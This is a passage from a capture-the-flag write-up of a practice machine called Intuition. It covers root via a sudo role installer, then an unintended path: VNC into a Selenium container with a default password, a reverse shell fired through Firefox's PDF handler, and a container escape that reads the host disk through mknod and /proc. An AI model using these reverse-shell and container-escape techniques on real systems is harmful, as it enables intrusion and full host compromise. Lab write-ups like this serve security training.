I’ll upload it and run it:

```

lopez@intuition:/dev/shm/.0xdf$ echo '{"run": {"action": "install", "role_file": "0xdf3.tar"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/dev/shm/.0xdf$ sudo /opt/runner2/runner2 0xdf.json 
Starting galaxy role install process
- extracting 0xdf3.tar to /root/.ansible/roles/0xdf3.tar
- 0xdf3.tar was installed successfully
[WARNING]: Meta file /root/.ansible/roles/0xdf3.tar is empty. Skipping dependencies.

```

Now I can SSH as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@comprezzor.htb
root@intuition:~# 

```

## Beyond Root - Unintended Root

### Background

When TheATeam originally rooted the box, they took a different path to root that involves exploiting the Selenium container responsible for simulating the user as a target of the XSS in the intended path.

This part turned out to be *way* more complicated than I expected. Thanks to jkr for walking me through how they did it.

### VNC Access

#### Identify VNC

Looking in the process list (`ps auxww`) there’s two docker containers running:

```

root        1640  0.0  0.1 1155828 5760 ?        Sl   17:14   0:02 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.21.0.2 -container-port 80
root       21400  0.0  0.0 1155828 3712 ?        Sl   19:28   0:05 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4444 -container-ip 172.21.0.4 -container-port 4444

```

The first is the web container (172.21.0.2) and the second is the Selenium Grid container (172.21.0.4) identified above.

[This article](https://sdetunicorns.com/blog/selenium-docker-vnc-viewer/) talks about how to debug Selenium tests in the Grid docker container using VNC by connecting to it on port 5900. That port isn’t listening on the host:

```

dev_acc@intuition:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:39747         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.21.0.1:21           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

```

But it is listening on the container:

```

dev_acc@intuition:~$ nc -zv 172.21.0.4 5900
Connection to 172.21.0.4 5900 port [tcp/*] succeeded!

```

#### Tunnel

I’ll disconnect my SSH session and reconnect with `-L 5900:172.21.0.4:5900`, creating a tunnel from TCP 5900 on my host to the container. I’ll use the built in Ubuntu Remote Desktop Viewer and connect:

![image-20240513174003613](/img/image-20240513174003613.png)

It requests a password:

![image-20240513174101405](/img/image-20240513174101405.png)

The article says the default is “secret”, and that works:

![image-20240513174807305](/img/image-20240513174807305.png)

This is VNC access to the Selenium docker container.

### Root Shell in Selenium Container

#### Failures

I can watch the bot get exploited by the XXS, but that’s not useful to me. I need a shell in this environment. It’s surprisingly difficult. I think the container is running in some kind of a sandboxed way. For example, I can right-click on the desktop and use the menus to try to open a shell:

![image-20240513174932519](/img/image-20240513174932519.png)

But nothing happens.

I’m able to start a Python webserver on my VM and load it in Firefox to download files:

![image-20240513175153674](/img/image-20240513175153674.png)

The files will download:

![image-20240513175207221](/img/image-20240513175207221.png)

I’m not able to open the file browser. I can click on the file and have it ask what application to open it with:

![image-20240513175243724](/img/image-20240513175243724.png)

Clicking Choose Application will let me pick anything on the file system. But nothing happens. I tried many things, including:
- running `bash` scripts with `bash`.
- creating an ELF with `msfvenom` and uploading it, and then selecting it as the application to open things with.
- opening files in firefox with Ctrl-o.

#### PDF Handler

What eventually works is changing how Firefox handles PDFs in the settings:

![image-20240513175522661](/img/image-20240513175522661.png)

I’ll edit that to “Use other…”:

![image-20240513175542355](/img/image-20240513175542355.png)

And select `/bin/bash`:

![image-20240513175604713](/img/image-20240513175604713.png)

Now I’ll save my shell as `shell.pdf`:

```

oxdf@hacky$ cat www/shell.sh
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1
oxdf@hacky$ cp www/shell.sh www/shell.pdf

```

It’s on the webserver:

![image-20240513175742838](/img/image-20240513175742838.png)

When I click, I get a shell at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.15 43300
bash: cannot set terminal process group (13): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

WARNING: Very high value reported by "ulimit -n". Consider passing "--ulimit nofile=32768" to "docker run".
seluser@25d42bb4575d:/$ 

```

#### Escalate

I’ll upgrade the shell using [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

seluser@25d42bb4575d:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

WARNING: Very high value reported by "ulimit -n". Consider passing "--ulimit nofile=32768" to "docker run".
seluser@25d42bb4575d:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
seluser@25d42bb4575d:/$

```

The seluser can run anything as root without a password:

```

seluser@25d42bb4575d:/$ sudo -l
Matching Defaults entries for seluser on 25d42bb4575d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User seluser may run the following commands on 25d42bb4575d:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

```

I’ll switch the shell to the root user:

```

seluser@25d42bb4575d:/$ sudo -i 
root@25d42bb4575d:~# 

```

### Host Raw Disk Access

#### Strategy

Now that I have root access in the container, I’m going to create a disk device inside the container that maps to the OS filesystem on the host. I’ll make sure that the permissions are such that a non-privileged user can access the device, and create a process as the same user that I have the shell on the host so that I can get access to the device through `/proc`.

#### Create Device

To create a device, I’ll need information about the device from the host:

```

dev_acc@intuition:~$ lsblk
NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
loop0                       7:0    0  63.5M  1 loop /snap/core20/2015
loop1                       7:1    0  74.2M  1 loop /snap/core22/1122
loop2                       7:2    0     4K  1 loop /snap/bare/5
loop3                       7:3    0  73.9M  1 loop /snap/core22/864
loop4                       7:4    0  63.9M  1 loop /snap/core20/2182
loop5                       7:5    0 349.7M  1 loop /snap/gnome-3-38-2004/143
loop6                       7:6    0 238.8M  1 loop /snap/firefox/3252
loop7                       7:7    0 496.9M  1 loop /snap/gnome-42-2204/132
loop8                       7:8    0   497M  1 loop /snap/gnome-42-2204/141
loop9                       7:9    0 240.3M  1 loop /snap/firefox/3290
loop10                      7:10   0  91.7M  1 loop /snap/gtk-common-themes/1535
loop11                      7:11   0 111.9M  1 loop /snap/lxd/24322
loop12                      7:12   0  39.1M  1 loop /snap/snapd/21184
loop13                      7:13   0  40.9M  1 loop /snap/snapd/20290
sda                         8:0    0    15G  0 disk 
├─sda1                      8:1    0     1M  0 part 
├─sda2                      8:2    0   512M  0 part /boot
└─sda3                      8:3    0  14.5G  0 part 
  ├─ubuntu--vg-ubuntu--lv 252:0    0  13.5G  0 lvm  /var/snap/firefox/common/host-hunspell
  │                                                 /
  └─ubuntu--vg-swap       252:1    0  1020M  0 lvm  [SWAP]

```

The device I want to target is the LVM partition, 252:0. I’ll use `mknod` to make this device:

```

root@25d42bb4575d:~# mknod /dev/rootfs b 252 0

```

I’ll want to open up the permissions:

```

root@25d42bb4575d:~# chmod 777 /dev/rootfs    
root@25d42bb4575d:~# ls -l /dev/rootfs
brwxrwxrwx 1 root root 252, 0 May 13 22:04 /dev/rootfs

```

#### Create User and Process

If I want to be able to access this via `/proc`, I need a process started as the same userid as the shell I have on the host:

```

dev_acc@intuition:~$ id
uid=1001(dev_acc) gid=1001(dev_acc) groups=1001(dev_acc)

```

In the container:

```

root@25d42bb4575d:~# useradd -u 1001 oxdf

```

Now I need to start a process that will run under this uid:

```

root@25d42bb4575d:~# su oxdf -c 'sleep 10000' &
[1] 3038
root@25d42bb4575d:~# ps auxww | grep oxdf
root        3038  0.0  0.1  12336  4480 pts/1    S    22:06   0:00 su oxdf -c sleep 10000
oxdf        3039  0.0  0.0   2892  1536 ?        Ss   22:06   0:00 sh -c sleep 10000
oxdf        3040  0.0  0.0   8372  1920 ?        S    22:06   0:00 sleep 10000

```

The PIDs of 3038, 3039, and 3040 won’t be the same in the host, but the processes will be there:

```

dev_acc@intuition:~$ ps auxww | grep sleep
root        5210  0.0  0.1  12336  4480 ?        S    22:06   0:00 su oxdf -c sleep 10000
dev_acc     5211  0.0  0.0   2892  1536 ?        Ss   22:06   0:00 sh -c sleep 10000
dev_acc     5212  0.0  0.0   8372  1920 ?        S    22:06   0:00 sleep 10000

```

#### Access FS

dev\_acc is able to access `/proc/5215` because it’s owned by uid 1001:

```

dev_acc@intuition:~$ ls -ld /proc/5212
dr-xr-xr-x 9 dev_acc dev_acc 0 May 13 22:07 /proc/5212

```

`rootfs` is there with open permissions:

```

dev_acc@intuition:/proc/5212$ ls -l root/dev/rootfs 
brwxrwxrwx 1 root root 252, 0 May 13 22:04 root/dev/rootfs

```

I can access it with `debugfs` and read the flag:

```

dev_acc@intuition:/proc/5212$ debugfs root/dev/rootfs
debugfs 1.46.5 (30-Dec-2021)
debugfs:  cat /root/root.txt
ab9d82b9************************

```